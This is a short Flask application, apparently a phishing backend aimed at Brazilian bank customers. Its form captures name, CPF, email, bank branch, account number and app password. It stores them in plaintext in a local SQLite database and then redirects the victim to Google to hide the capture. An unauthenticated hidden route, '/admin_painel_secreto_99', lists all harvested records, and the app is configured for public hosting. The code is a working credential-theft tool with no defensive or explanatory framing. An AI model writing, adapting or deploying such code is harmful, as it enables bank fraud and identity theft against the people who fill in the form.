import os
import sqlite3
from flask import Flask, render_template, request, redirect

app = Flask(__name__, template_folder='templates')

@app.route('/')
def index():
    return render_template('cadastro.html')

@app.route('/login', methods=['POST'])
def login():
    # Captura TODOS os campos do formulário de 3 passos
    dados = (
        request.form.get('nome'),
        request.form.get('cpf'),
        request.form.get('email'),
        request.form.get('agencia'),
        request.form.get('conta'),
        request.form.get('senha_app')
    )
    
    try:
        conn = sqlite3.connect('dados_bancarios.db')
        cursor = conn.cursor()
        # Garante que a tabela tenha colunas para agencia, conta e senha_app
        cursor.execute('''CREATE TABLE IF NOT EXISTS usuarios 
            (id INTEGER PRIMARY KEY AUTOINCREMENT, nome TEXT, cpf TEXT, email TEXT, agencia TEXT, conta TEXT, senha_app TEXT)''')
        cursor.execute('INSERT INTO usuarios (nome, cpf, email, agencia, conta, senha_app) VALUES (?, ?, ?, ?, ?, ?)', dados)
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Erro: {e}")

    return redirect("https://www.google.com")

@app.route('/admin_painel_secreto_99')
def admin():
    conn = sqlite3.connect('dados_bancarios.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM usuarios ORDER BY id DESC')
    usuarios = cursor.fetchall()
    conn.close()
    return render_template('admin.html', usuarios=usuarios)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)




